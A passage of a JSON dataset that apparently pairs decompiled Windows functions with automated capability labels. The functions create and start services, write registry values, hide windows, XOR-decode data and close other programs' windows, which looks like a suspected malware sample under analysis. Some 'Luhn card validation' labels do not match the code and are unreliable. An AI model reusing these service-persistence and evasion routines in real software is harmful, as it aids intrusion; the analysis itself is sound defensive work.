0;\n    }\n    return 0;\n}\n",
        "token_count": 662
    },
    "00402d60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00402d60(uint *arg_8h, uint *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    bool bVar4;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar3 = &var_67h;\n    for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    bVar4 = false;\n    uVar1 = fcn.00402c30(&var_68h, &var_4h);\n    if ((!bVar4) && (bVar4)) {\n        out(0xbd, uVar1);\n        return;\n    }\n    fcn.00402bc0(&var_68h, var_4h, 0x411580, 0x12000);\n    *arg_8h = 0x411580;\n    *arg_ch = 0x12000;\n    return;\n}\n",
        "token_count": 307
    },
    "00403030": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040309a) overlaps instruction at (ram,0x00403098)\n// \n// WARNING: Variable defined which should be unmapped: var_1h\n\nfloat10 __cdecl fcn.00403030(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint32_t *puVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    float fVar4;\n    uchar *puVar5;\n    uint32_t uVar6;\n    uint8_t uVar7;\n    int32_t *piVar8;\n    uint32_t uVar9;\n    int32_t *piVar10;\n    uint32_t unaff_EBX;\n    char *pcVar11;\n    int32_t unaff_EDI;\n    float10 in_ST0;\n    uchar auStack24 [4];\n    uint var_1h;\n    \n    uVar9 = 0;\n    if (0 < arg_14h) {\n        do {\n            uVar6 = (unaff_EBX >> 8 & 0xffff00) << 8;\n            pcVar11 = uVar6 | unaff_EBX & 0xffff;\n            piVar10 = uVar9 % arg_ch;\n            uVar7 = *(uVar9 + arg_10h) ^ *(piVar10 + arg_8h);\n            piVar8 = uVar9 / arg_ch & 0xffffff00U | uVar7;\n            if ((-1 < uVar7) && (-1 >= uVar7)) {\n                piVar8 = piVar8 + -0x7499f18a;\n                puVar2 = pcVar11 + 0x2a0777f6;\n                uVar7 = uVar9 & 7;\n                *puVar2 = *puVar2 >> uVar7 | *puVar2 << 8 - uVar7;\n                unaff_EDI = unaff_EDI - *piVar8;\ncode_r0x004030a8:\n                puVar1 = unaff_EDI + -0x75;\n                puVar5 = *puVar1;\n                *puVar1 = *puVar1 - auStack24;\n                iVar3 = *piVar10;\n                fVar4 = *(pcVar11 + 0x1c881045);\n                *(uVar9 + 0x3b) = *(uVar9 + 0x3b) + (piVar8 & 0xffffff00 | piVar8 + -0x76 + (puVar5 < auStack24));\n                return (in_ST0 / iVar3) * fVar4;\n            }\n            if ((uVar7 != 0) && (uVar7 == 0)) {\n                uVar9 = uVar9 & 0xffff0000 | CONCAT11((uVar9 >> 8) - *pcVar11, uVar9);\n                goto code_r0x004030a8;\n            }\n            uVar7 = arg_14h ^ uVar7;\n            unaff_EBX = uVar6 | unaff_EBX & 0xff00 | uVar7;\n            *(uVar9 + arg_10h) = uVar7;\n            uVar9 = uVar9 + 1;\n        } while (uVar9 < arg_14h);\n    }\n    return in_ST0;\n}\n",
        "token_count": 751
    },
    "00403dc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403dc0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00401bd0(arg_8h, arg_ch, &var_8h, &var_4h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    *(iVar1 + 0x58) = var_4h;\n    fcn.00401bd0(arg_8h, arg_ch, &var_8h, &var_4h);\n    return 1;\n}\n",
        "token_count": 157
    },
    "00403e30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403e30(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 103
    },
    "00404560": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404625) overlaps instruction at (ram,0x00404622)\n// \n\nuint __cdecl fcn.00404560(uint arg_8h, int32_t arg_ch)\n\n{\n    uint16_t extraout_CX;\n    int32_t iVar1;\n    uint *puVar2;\n    bool bVar3;\n    uint32_t uVar4;\n    uchar var_108h;\n    uint var_107h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(arg_8h, *0x10 + -8);\n    if (arg_ch != var_4h) {\n        return 1;\n    }\n    var_108h = 0;\n    puVar2 = &var_107h;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.USER32.dll_GetClassNameA)(arg_8h, &var_108h, 0x104);\n    uVar4 = 0x4114c4;\n    iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_108h, 0x4114c4);\n    bVar3 = iVar1 == 0;\n    if (!bVar3) {\n        return 1;\n    }\n    if ((bVar3) || (uVar4 = uVar4 & 0xffff | extraout_CX << 0x10,  !bVar3)) {\n        uVar4 = 0;\n    }\n    (*_sym.imp.USER32.dll_EnumChildWindows)(arg_8h, 0x4044e0, 0x47, uVar4);\n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    (*_sym.imp.KERNEL32.dll_Sleep)((iVar1 % 10 + 4) * 1000);\n    (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n    return 0;\n}\n",
        "token_count": 506
    },
    "00402a10": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402a10(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 64
    },
    "004013a0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004013a0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EDI;\n    bool in_SF;\n    float10 in_ST0;\n    \n    if ((!in_SF) && (in_SF)) {\n        *(unaff_EDI + 0x1c) = in_ST0;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 192
    },
    "004018d0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040191e) overlaps instruction at (ram,0x0040191d)\n// \n// WARNING: Removing unreachable block (ram,0x0040190e)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004018d0(uint hSCManager, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.ADVAPI32.dll_DeleteService)();\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n    return uVar2;\n}\n",
        "token_count": 168
    },
    "004027a0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get service handle",
            "start service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004027a0(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x420) {\n            iVar3 = (*pcVar1)();\n            if (iVar3 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 242
    },
    "00402120": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool __cdecl fcn.00402120(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint hKey;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(arg_8h, arg_ch, 0, 0xf003f, &hKey);\n    if (iVar1 != 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    return iVar1 == 0;\n}\n",
        "token_count": 207
    },
    "00404cb0": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404cb0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 97
    },
    "00402b30": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402b7e) overlaps instruction at (ram,0x00402b7d)\n// \n// WARNING: Removing unreachable block (ram,0x00402b7e)\n\nulong __cdecl fcn.00402b30(uint32_t arg_8h, uint16_t *arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint16_t uVar3;\n    uint32_t in_EDX;\n    uint32_t uVar4;\n    uint32_t *unaff_EDI;\n    uint32_t *puVar5;\n    bool bVar6;\n    bool bVar7;\n    \n    bVar7 = false;\n    uVar4 = arg_10h;\n    if (arg_10h != 0) {\n        do {\n            bVar6 = uVar4 < 0;\n            puVar5 = unaff_EDI;\n            if (bVar7 == bVar6) {\n                uVar3 = uVar4 & 0xff;\n                uVar1 = uVar4 & 0xffff0000;\n                uVar2 = uVar3 | (uVar4 >> 8) << 8;\n                uVar4 = uVar1 | uVar2;\n                if (bVar7 != bVar6) {\n                    out(0xc4, arg_10h);\n                    uVar4 = uVar1 | uVar2 & 0xffffff00 | uVar3 ^ arg_ch;\n                    puVar5 = unaff_EDI + 1;\n                    *unaff_EDI = arg_10h;\n                }\n            }\n            arg_8h = arg_8h + *arg_ch;\n            arg_10h = arg_8h >> 0x10;\n            if (arg_8h >> 0x10 != 0) {\n                arg_10h = arg_10h + (arg_8h & 0xffff);\n                arg_8h = arg_10h;\n            }\n            arg_ch = arg_ch + 1;\n            bVar7 = SBORROW4(uVar4, 1);\n            in_EDX = uVar4 - 1;\n            uVar4 = in_EDX;\n            unaff_EDI = puVar5;\n        } while (in_EDX != 0);\n    }\n    return CONCAT44(in_EDX, (arg_8h >> 0x10) + arg_8h);\n}\n",
        "token_count": 540
    },
    "00402bc0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402c10) overlaps instruction at (ram,0x00402c0f)\n// \n// WARNING: Removing unreachable block (ram,0x00402c00)\n\nvoid __cdecl fcn.00402bc0(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if (arg_14h != 0) {\n        do {\n            *(uVar1 + arg_10h) = *(uVar1 + arg_10h) ^ *(uVar1 % arg_ch + arg_8h);\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 188
    },
    "00404010": {
        "rules": [
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004040b4) overlaps instruction at (ram,0x004040b0)\n// \n// WARNING: Removing unreachable block (ram,0x0040449a)\n// WARNING: Removing unreachable block (ram,0x00404127)\n// WARNING: Removing unreachable block (ram,0x00404142)\n// WARNING: Removing unreachable block (ram,0x004041a9)\n// WARNING: Removing unreachable block (ram,0x00404420)\n// WARNING: Removing unreachable block (ram,0x0040442b)\n// WARNING: Removing unreachable block (ram,0x00404434)\n// WARNING: Removing unreachable block (ram,0x004041b1)\n// WARNING: Removing unreachable block (ram,0x004041cc)\n// WARNING: Removing unreachable block (ram,0x004043fb)\n// WARNING: Removing unreachable block (ram,0x004041d4)\n// WARNING: Removing unreachable block (ram,0x004041e8)\n// WARNING: Removing unreachable block (ram,0x004041fc)\n// WARNING: Removing unreachable block (ram,0x00404234)\n// WARNING: Removing unreachable block (ram,0x0040425f)\n// WARNING: Removing unreachable block (ram,0x00404284)\n// WARNING: Removing unreachable block (ram,0x004043cf)\n// WARNING: Removing unreachable block (ram,0x004043d7)\n// WARNING: Removing unreachable block (ram,0x004043dd)\n// WARNING: Removing unreachable block (ram,0x0040428c)\n// WARNING: Removing unreachable block (ram,0x0040437f)\n// WARNING: Removing unreachable block (ram,0x0040438a)\n// WARNING: Removing unreachable block (ram,0x00404390)\n// WARNING: Removing unreachable block (ram,0x0040439b)\n// WARNING: Removing unreachable block (ram,0x004043e8)\n// WARNING: Removing unreachable block (ram,0x004043ee)\n// WARNING: Removing unreachable block (ram,0x004043f9)\n// WARNING: Removing unreachable block (ram,0x0040443c)\n// WARNING: Removing unreachable block (ram,0x00404442)\n// WARNING: Removing unreachable block (ram,0x004042a0)\n// WARNING: Removing unreachable block (ram,0x004042da)\n// WARNING: Removing unreachable block (ram,0x004042ed)\n// WARNING: Removing unreachable block (ram,0x004042ef)\n// WARNING: Removing unreachable block (ram,0x0040439d)\n// WARNING: Removing unreachable block (ram,0x004043bc)\n// WARNING: Removing unreachable block (ram,0x004043c2)\n// WARNING: Removing unreachable block (ram,0x004043cd)\n// WARNING: Removing unreachable block (ram,0x00404403)\n// WARNING: Removing unreachable block (ram,0x00404409)\n// WARNING: Removing unreachable block (ram,0x00404414)\n// WARNING: Removing unreachable block (ram,0x0040441a)\n// WARNING: Removing unreachable block (ram,0x00404446)\n// WARNING: Removing unreachable block (ram,0x00404324)\n// WARNING: Removing unreachable block (ram,0x00404336)\n// WARNING: Removing unreachable block (ram,0x0040433c)\n// WARNING: Removing unreachable block (ram,0x00404347)\n// WARNING: Removing unreachable block (ram,0x0040434d)\n// WARNING: Removing unreachable block (ram,0x004042a7)\n// WARNING: Removing unreachable block (ram,0x004042b2)\n// WARNING: Removing unreachable block (ram,0x004042b8)\n// WARNING: Removing unreachable block (ram,0x004042c3)\n// WARNING: Removing unreachable block (ram,0x004042c9)\n// WARNING: Removing unreachable block (ram,0x004042d8)\n// WARNING: Removing unreachable block (ram,0x00404358)\n// WARNING: Removing unreachable block (ram,0x0040435e)\n// WARNING: Removing unreachable block (ram,0x004041ef)\n// WARNING: Removing unreachable block (ram,0x004041fa)\n// WARNING: Removing unreachable block (ram,0x0040423f)\n// WARNING: Removing unreachable block (ram,0x00404245)\n// WARNING: Removing unreachable block (ram,0x00404250)\n// WARNING: Removing unreachable block (ram,0x00404256)\n// WARNING: Removing unreachable block (ram,0x00404362)\n// WARNING: Removing unreachable block (ram,0x0040437a)\n// WARNING: Removing unreachable block (ram,0x0040444c)\n// WARNING: Removing unreachable block (ram,0x00404456)\n// WARNING: Removing unreachable block (ram,0x0040445c)\n// WARNING: Removing unreachable block (ram,0x0040446a)\n// WARNING: Removing unreachable block (ram,0x00404470)\n// WARNING: Removing unreachable block (ram,0x00404101)\n// WARNING: Removing unreachable block (ram,0x0040411f)\n// WARNING: Removing unreachable block (ram,0x00404493)\n// WARNING: Removing unreachable block (ram,0x004044ae)\n// WARNING: Removing unreachable block (ram,0x004044c1)\n\nuint fcn.00404010(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint32_t unaff_EDI;\n    ushort in_SS;\n    int32_t *in_FS_OFFSET;\n    bool bVar3;\n    bool bVar4;\n    uint var_44h;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint *puStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x405180;\n    while( true ) {\n        puStack16 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &puStack16;\n        (*_sym.imp.ole32.dll_CoInitialize)(0, unaff_EDI);\n        unaff_EDI = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x4114e8);\n        bVar3 = false;\n        bVar4 = (POPCOUNT(unaff_EDI & 0xff) & 1U) == 0;\n        if (unaff_EDI == 0) {\n            *in_FS_OFFSET = puStack16;\n            return 1;\n        }\n        (*_sym.imp.USER32.dll_RegisterWindowMessageA)(0x4114f4);\n        if ((bVar4) || (!bVar4)) goto code_r0x00404093;\n        segment(in_SS, *0x10 + -0xc);\n        if (bVar3) break;\n        if (!bVar4) {\n            uStack12 = 0xb7bc9ea5;\ncode_r0x00404093:\n            puStack16 = &uStack28;\n            uStack20 = 1000;\n            uStack24 = 2;\n            uStack28 = 0;\n            (*_sym.imp.USER32.dll_SendMessageTimeoutA)();\n            pcVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n            if (pcVar1 != NULL) {\n                uStack8 = 0;\n                uVar2 = (*pcVar1)();\n                uStack8 = 0xffffffff;\n                (*_sym.imp.KERNEL32.dll_FreeLibrary)();\n                (*_sym.imp.ole32.dll_CoUninitialize)();\n                *in_FS_OFFSET = puStack16;\n                return uVar2;\n            }\n            *in_FS_OFFSET = puStack16;\n            return 1;\n        }\n    }\n    *(unaff_EDI - 1) = *(unaff_EDI - 1) + -0x5b;\n    goto code_r0x00404093;\n}\n",
        "token_count": 1716
    },
    "00402df0": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00402df0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4112c8, 0x41130c, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 81
    }
}